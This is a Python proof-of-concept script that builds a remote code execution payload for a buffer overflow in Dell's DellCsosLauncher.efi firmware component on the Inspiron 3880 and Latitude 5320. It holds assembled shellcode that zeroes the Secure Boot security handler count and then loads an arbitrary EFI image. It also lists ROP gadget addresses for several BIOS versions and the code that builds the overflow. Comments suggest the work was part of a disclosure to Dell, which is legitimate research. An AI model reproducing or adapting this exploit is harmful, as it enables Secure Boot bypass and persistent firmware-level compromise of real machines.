#!/usr/bin/python3

import binascii
import io
import string
import struct
import sys

# use https://github.com/reyammer/shellnoob as a simple wrapper around assembler
sys.path.append(r'/y/work/tools/shellnoob')
from shellnoob import ShellNoob

sn = ShellNoob(flag_64_bit=True, flag_intel=True)

def asm2bin(*arg):
    asm = arg[0]

    # include sketchy parameter support for tweaking assembly
    if len(arg) > 1:
        for i in range(1, len(arg)):
            #sys.stderr.write("param%u: %s\n" % (i, arg[i]))
            asm = asm.replace("##PARAM%u##" % i, str(arg[i]))

    bindata = sn.asm_to_bin(asm)

    return bindata

# param1 is search start address
# param2 is search size
dellrce_payload_asm = """
BS        = -0x10
TAIL_BUF  = -0x18
NEWHANDLE = -0x20
PROGRESS  = -0x24
DEBUG     = -0x28
STATUS    = -0x30
FOUNDCSOS = -0x38
FOUNDSEC  = -0x40
FOUNDSHL  = -0x48
EXDATSIZE = -0x58
EXTRADATA = -0xa0

LoadImage  = 0xc8
StartImage = 0xd0

csos_bootserv_ptr = 0x448a9
csos_handle_ptr   = 0x44899

FindCsos       = 0
FindSecHandler = 2
FindShell      = 4
EfiOffset      = 8

  # save address of footer payload
  mov   r15,QWORD PTR [rsp]

  # move stack away from overflow site and set up local frame
  sub   rsp,0x200
  mov   rbp,rsp
  sub   rsp,0x100

  mov  bx,0xbeef		# mark debug status okay
  mov  [rbp+DEBUG], bx

  xor  bx,bx			# keep track of what step we're
  mov  [rbp+PROGRESS], bx	# on for debugging purposes

  mov   [rbp+TAIL_BUF], r15	# save tail buffer ptr

  lea	rax, [r15+FindCsos]
  movabs rdi, ##PARAM1##
  movabs rsi, ##PARAM2##
  call  rax			# find address of DellCsosLauncher.efi

  cmp  rax,0xffffffffffffffff	# die if we can't find it
  je   dead

found_ptrs:
  mov  bx,0x1111		# update progress tracking
  mov  [rbp+PROGRESS], bx

  mov   [rbp+FOUNDCSOS],rax
  mov   r14, rax

  mov  rax,[r14+csos_bootserv_ptr]
  mov  [rbp+BS], rax		# save boot services ptr

  lea	rax, [r15+FindSecHandler]
  movabs rdi, ##PARAM1##
  movabs rsi, ##PARAM2##
  call  rax			# find address of mNumberOfSecurity2Handler

  cmp  rax,0xffffffffffffffff	# die if we can't find it
  je   dead

found_sec_handler:
  mov  bx,0x2222		# update progress tracking
  mov  [rbp+PROGRESS], bx

  mov  [rbp+FOUNDSEC],rax	# store pointer for debugging

  xor  rbx,rbx
  mov  [rax],rbx		# zero the registered security handler count

# Dell Ramdisk implementation in Inspiron 3880 included entire
# file in contiguous block, so we could just search for 2nd
# stage in memory and load it directly
#
#  lea	rax, [r15+FindShell]
#  movabs rdi, 0x50000000
#  movabs rsi, 0x0f000000
#  call  rax			# find address of Shell.efi in ramdisk
#
#  cmp  rax,0xffffffffffffffff
#  je   dead

  mov	rax,r15			# calculate address of efi to load
  add	rax,[r15+EfiOffset]

found_shell:
  mov  bx,0x3333		# update progress tracking
  mov  [rbp+PROGRESS], bx

  mov   [rbp+FOUNDSHL],rax	# save address of 2nd stage for debugging

  lea  rax,[rbp+NEWHANDLE]	# ImageHandle
  xor  rbx,rbx
  mov  [rax],rbx
  mov  [rsp+0x28], rax
  mov  rbx,[rbp+FOUNDSHL]	# first qword is length
  mov  rbx,[rbx]
  mov  [rsp+0x20], rbx
  mov  r9,[rbp+FOUNDSHL]	# SourceBuffer = pointer to payload data
  add  r9,8

# INCREDIBLY SKETCHY HACK
# amazingly enough, Dell Ramdisk implementation in Inspiron 3880
# stores downloaded files in contiguous blocks at completely 
# predictable addresses, so it worked to just hardcode the address
# of the 2nd stage payload that we downloaded
#
# mov  rbx, 951744
# mov  [rsp+0x20], rbx
# mov  r9, 0x000000001139AC00

  xor  r8,r8                    # DevicePath = NULL
  mov  rdx, [r14+csos_handle_ptr] # ParentImageHandle = handle passed to vulnerable pe
  xor  rcx,rcx                  # BootPolicy = FALSE
  mov  rax, [r14+csos_bootserv_ptr]      # get boot services ptr
  call [rax+LoadImage]          # call BootServices->LoadImage()

  test rax,rax
  jl   dead

load_ok:
  mov  bx,0x4444
  mov  [rbp+PROGRESS], bx

  lea  r8,[rbp+EXTRADATA]  # ExitData = local buffer
  lea  rdx,[rbp+EXDATSIZE]
  mov  rcx,64              # *ExitDataSize = 64
  mov  [rdx],rcx           # *ExitDataSize = 64
  lea  rax,[rbp+NEWHANDLE] # ImageHandle = value returned from LoadImage()
  mov  rcx, [rax]
  mov  rax, [r14+csos_bootserv_ptr]      # get boot services ptr
  call [rax+StartImage]    # call BootServices->StartImage()

  test rax,rax
  jl   dead

start_ok:
  mov  bx,0x5555
  mov  [rbp+PROGRESS], bx
  jmp  infinite_loop

dead:
  mov  [rbp+STATUS], rax   # save return value from failed operation
  mov  bx,0xdead           # mark debug status as failed
  mov  [rbp+DEBUG], bx

infinite_loop:             # spin forever so we can dump memory
  jmp infinite_loop        # and figure out what happened
"""

# helper functions which are appended to payload after return address
# overflow and jump to start of payload which are used to find
# DellCsosLauncher.efi, SecurityStubDxe, and (originally) Shell.efi

# param1 is mNumberOfSecurity2Handler offset from search pattern
find_ptrs_asm = """
search:
    jmp find_csos
    jmp find_sec_handler
# used in initial payload for inspiron 3880
#    jmp find_shell
    nop
    nop
    nop
    nop

    .quad end_of_payload-search

find_csos:
    xor    rax,rax
    lea    r8,[rip+csos_needle]
    sub    rsi,0x12
    
csos_outer_loop:
    xor    rdx,rdx

csos_loop:
    lea    rcx,[rdi+rax*1]
    mov    r9b,BYTE PTR [rcx+rdx*1]
    cmp    BYTE PTR [r8+rdx*1],r9b
    jne    csos_next
    
    inc    rdx
    cmp    rdx,0x12
    jne    csos_loop
    
    cmp    QWORD PTR [rdi+rax*1+0x448a9],0x0
    jne    csos_check_last
    
csos_next:
    inc    rax
    cmp    rsi,rax
    jnb    csos_outer_loop
    
csos_not_found:
    or     rax,0xffffffffffffffff
    ret    
    
csos_check_last:
    cmp    QWORD PTR [rdi+rax*1+0x44899],0x0
    je     csos_next
    
    mov    rax,rcx
    ret    

find_sec_handler:
    xor    rdx,rdx
    lea    rcx,[rip+dxecore_needle]
    sub    rsi,0x11
    
sec_outer_loop:
    xor    rax,rax

sec_loop:
    lea    r8,[rdi+rdx*1]
    mov    r9b,BYTE PTR [r8+rax*1]
    cmp    BYTE PTR [rcx+rax*1],r9b
    jne    sec_next
    
    inc    rax
    cmp    rax,0x11
    jne    sec_loop
    
    jmp    sec_check_ptr
    
sec_next:
    inc    rdx
    cmp    rsi,rdx
    jnb    sec_outer_loop
    
sec_not_found:
    or     rax,0xffffffffffffffff
    ret    
    
sec_check_ptr:
    lea    rax,[rdi+rdx*1+0x8586c]
    cmp    QWORD PTR [rax],0x0
    je     sec_next
    
    ret    

# used in initial payload for inspiron 3880
#
# find_shell:
#     xor    rdx,rdx
#     lea    rcx,[rip+shell_needle]
#     sub    rsi,0x10
# 
# shell_outer_loop:
#     xor    rax,rax
# 
# shell_loop:
#     lea    r8,[rdi+rdx*1]
#     mov    r9b,BYTE PTR [r8+rax*1]
#     cmp    BYTE PTR [rcx+rax*1],r9b
#     jne    shell_next
# 
#     inc    rax
#     cmp    rax,0x10
#     jne    shell_loop
#     
#     lea    rax,[rdi+rdx*1-0x1000]
#     ret    
# 
# shell_next:
#     inc    rdx
#     cmp    rsi,rdx
#     jnb    shell_outer_loop
#     
# shell_not_found:
#     or     rax,0xffffffffffffffff
#     ret    
    
csos_needle:
    .byte 0x48, 0x39, 0x3D, 0xAA, 0x48, 0x04, 0x00, 0x48, 0x89, 0x05, 0x83, 0x48, 0x04, 0x00, 0x48, 0x8B, 0x42, 0x60

dxecore_needle:
    .byte 0x49, 0x8B, 0xF9, 0x49, 0x8B, 0xF0, 0x44, 0x8B, 0xFA, 0x44, 0x8B, 0xF1, 0x4D, 0x85, 0xC0, 0x75, 0x11

# used in initial payload for inspiron 3880
#shell_needle:
#    .byte 0x8B, 0x0D, 0xCA, 0x7B, 0x06, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x0A, 0x48, 0x8B, 0x05, 0x16, 0xF3
end_of_payload:
"""

# initial shellcode used to confirm RCE
test_shellcode_asm = """
  sub	rsp,0x1000
  mov	rax,0x9ef01234
  mov	bl,0xde
  mov	[rax],bl
  inc	rax
  mov	bl,0xad
  mov	[rax],bl
  inc	rax
  mov	bl,0xbe
  mov	[rax],bl
  inc	rax
  mov	bl,0xef
  mov	[rax],bl
  inc	rax
  mov	bl,0xca
  mov	[rax],bl
  inc	rax
  mov	bl,0xfe
  mov	[rax],bl
  inc	rax
  mov	bl,0xba
  mov	[rax],bl
  inc	rax
  mov	bl,0xbe
  mov	[rax],bl
  inc	rax
L1: jmp L1
"""

inspiron_3880_search_start = 0xa0000000
inspiron_3880_search_size  = 0x12000000

latitude_5320_search_start = 0x5e000000
latitude_5320_search_size  = 0x0fffffff

payload_search_start = latitude_5320_search_start
payload_search_size  = latitude_5320_search_size

shellcode = asm2bin(dellrce_payload_asm, payload_search_start, payload_search_size)

inspiron_3880_sechandler_offset = 0x66b0
latitude_5320_sechandler_offset = 0x8586c

sechandler_offset = latitude_5320_sechandler_offset

find_ptrs = asm2bin(find_ptrs_asm, sechandler_offset)

# we'll start executing right after the overflow address,
# so we'll use call to jump back to the start of our payload
# and save the address to our appended helper functions
call_shellcode_asm = """
L1: call L1-(0x150-0x20+(9*8))-3
"""
call_shellcode = asm2bin(call_shellcode_asm)

# $ ropper -a x86_64 --file 1\ --\ 1\ System\ BIOS\ with\ BIOS\ Guard\ \[V8\]\ v1.3.8.bin --search "pop rdi; pop rdi; ret;"
# [INFO] Load gadgets for section: bytes
# [LOAD] loading... 100%
# [LOAD] removing double gadgets... 100%
# [INFO] Searching for gadgets: pop rdi; pop rdi; ret
# 
# [INFO] File: 1 -- 1 System BIOS with BIOS Guard [V8] v1.3.8.bin
# 0x000000000015379a: pop rdi; pop rdi; ret;
# 
# $ ropper -a x86_64 --file 1\ --\ 1\ System\ BIOS\ with\ BIOS\ Guard\ \[V8\]\ v1.3.8.bin --search "jmp rsp"
# [INFO] Load gadgets from cache
# [LOAD] loading... 100%
# [LOAD] removing double gadgets... 100%
# [INFO] Searching for gadgets: jmp rsp
# 
# [INFO] File: 1 -- 1 System BIOS with BIOS Guard [V8] v1.3.8.bin
# 0x00000000001353b5: jmp rsp;

bios_region_base = 0xff000000

# $ grep -ir 0x0000000000fff0a2 *_extracted/*poppopret.txt
# Inspiron_3880_1.1.3.exe_extracted/3880-1.1.3-poppopret.txt:0x0000000000fff0a2: pop rsi; pop rbx; ret;
# Inspiron_3880_1.1.4.exe_extracted/3880-1.1.4-poppopret.txt:0x0000000000fff0a2: pop rsi; pop rbx; ret;
# Inspiron_3880_1.2.0.exe_extracted/3880-1.2.0-poppopret.txt:0x0000000000fff0a2: pop rsi; pop rbx; ret;
# Inspiron_3880_1.3.1.exe_extracted/3880-1.3.1-poppopret.txt:0x0000000000fff0a2: pop rsi; pop rbx; ret;
# Inspiron_3880_1.3.1.exe_extracted/3880-1.3.1-poppopret.txt:0x0000000000fff0a2: pop rsi; pop rbx; ret;
# Inspiron_3880_1.3.10.exe_extracted/3880-1.3.10-poppopret.txt:0x0000000000fff0a2: pop rsi; pop rbx; ret;

# $ grep -ir 0x0000000000fffafb *_extracted/*jmprsp.txt
# Inspiron_3880_1.1.3.exe_extracted/3880-1.1.3-jmprsp.txt:0x0000000000fffafb: jmp rsp;
# Inspiron_3880_1.1.4.exe_extracted/3880-1.1.4-jmprsp.txt:0x0000000000fffafb: jmp rsp;
# Inspiron_3880_1.2.0.exe_extracted/3880-1.2.0-jmprsp.txt:0x0000000000fffafb: jmp rsp;
# Inspiron_3880_1.3.1.exe_extracted/3880-1.3.1-jmprsp.txt:0x0000000000fffafb: jmp rsp;
# Inspiron_3880_1.3.10.exe_extracted/3880-1.3.10-jmprsp.txt:0x0000000000fffafb: jmp rsp;

# inspiron 3880 gadget addresses used in initial payload sent to Dell
#inspiron_3880_poppopret = bios_region_base + 0x15379a
#inspiron_3880_jmprsp    = bios_region_base + 0x1353b5

inspiron_3880_poppopret = bios_region_base + 0x0000000000fff0a2
inspiron_3880_jmprsp    = bios_region_base + 0x0000000000fffafb

# $ grep -ir 0x0000000000fff07a  *_extracted/*poppopret.txt
# Latitude_5320_1.0.2.exe_extracted/5320-1.0.2-poppopret.txt:0x0000000000fff07a: pop rsi; pop rbx; ret;
# Latitude_5320_1.3.0.exe_extracted/5320-1.3.0-poppopret.txt:0x0000000000fff07a: pop rsi; pop rbx; ret;
# Latitude_5320_1.4.2.exe_extracted/5320-1.4.2-poppopret.txt:0x0000000000fff07a: pop rsi; pop rbx; ret;
# Latitude_5320_1.5.1.exe_extracted/5320-1.5.1-poppopret.txt:0x0000000000fff07a: pop rsi; pop rbx; ret;
# Latitude_5320_1.6.0.exe_extracted/5320-1.6.0-poppopret.txt:0x0000000000fff07a: pop rsi; pop rbx; ret;

# $ grep -ir 0x0000000000fffb37 *_extracted/*jmprsp.txt
# Latitude_5320_1.0.2.exe_extracted/5320-1.0.2-jmprsp.txt:0x0000000000fffb37: jmp rsp;
# Latitude_5320_1.3.0.exe_extracted/5320-1.3.0-jmprsp.txt:0x0000000000fffb37: jmp rsp;
# Latitude_5320_1.4.2.exe_extracted/5320-1.4.2-jmprsp.txt:0x0000000000fffb37: jmp rsp;
# Latitude_5320_1.5.1.exe_extracted/5320-1.5.1-jmprsp.txt:0x0000000000fffb37: jmp rsp;
# Latitude_5320_1.6.0.exe_extracted/5320-1.6.0-jmprsp.txt:0x0000000000fffb37: jmp rsp;

latitude_5320_poppopret = bios_region_base + 0x0000000000fff07a
latitude_5320_jmprsp    = bios_region_base + 0x0000000000fffb37

poppopret = latitude_5320_poppopret
jmprsp    = latitude_5320_jmprsp

# local stack frame is 5*8 saved registers + 0x150 of local variable space
#
# dest buffer is at rsp+20h
# calls freepool on ptr at rsp+0x188 before executing ret opcode
 
shellcode_len = (0x150-0x20)+(8*5)	# local stack frame space is 0x150, buf at 0x20
sys.stderr.write("max_shellcode = %d, shellcode = %d, findptrs = %d, total = %d\n" % (shellcode_len, len(shellcode), len(find_ptrs), len(shellcode) + len(find_ptrs)))

if len(shellcode) > shellcode_len:
    print("Shellcode too long %d  - Must be %d bytes or less..." % (len(shellcode), shellcode_len))
    sys.exit(1)

nop      = b"\x90"

sled_len = shellcode_len - len(shellcode)
sled     = nop*sled_len

# WORKING
retaddr  = struct.pack("<Q", poppopret)	# return address
pad2     = b"!FOOBAR!"			# tag to be able to easily find payload in pcileech dumps
freeaddr = struct.pack("<Q", 0)		# ptr passed to gBS->FreePool() can be zeroed
nextret  = struct.pack("<Q", jmprsp)	

pe_filename = "Shim.efi"

with open(pe_filename, 'rb') as f:
    pe_to_run = f.read()

pe_size = len(pe_to_run)
packed_pe_size = struct.pack("<Q", pe_size)

findptrs_size = len(find_ptrs)		
packed_findptrs_size = struct.pack("<Q", findptrs_size)

payload = sled + shellcode + retaddr + pad2 + freeaddr + nextret + nop*3 + call_shellcode + find_ptrs + packed_pe_size + pe_to_run

sys.stdout.buffer.write(binascii.hexlify(payload))
